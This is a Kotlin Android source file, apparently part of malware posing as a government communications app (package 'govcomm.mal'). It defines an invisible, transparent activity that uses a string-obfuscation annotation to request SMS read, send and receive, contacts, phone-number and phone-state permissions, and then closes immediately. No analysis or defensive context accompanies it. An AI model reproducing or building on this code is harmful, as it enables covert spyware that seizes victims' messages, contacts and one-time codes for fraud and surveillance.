package com.mobilesec.govcomm.mal

import android.app.Activity
import android.os.Bundle
import android.view.Window
import android.graphics.drawable.ColorDrawable
import androidx.core.app.ActivityCompat
import android.Manifest
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import io.github.c0nnor263.obfustringcore.ObfustringThis

@ObfustringThis
class PermissionRequestActivity: Activity() {
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestWindowFeature(Window.FEATURE_NO_TITLE)
        window.setBackgroundDrawable(ColorDrawable(android.graphics.Color.TRANSPARENT))
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.ACCESS_NOTIFICATION_POLICY
            ),
            PERMISSION_REQUEST_CODE
        )
        Log.d("PermissionsRequestActivity", "Testing permission")
    }

    companion object {
        const val PERMISSION_REQUEST_CODE = 123
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        finish()
    }
}
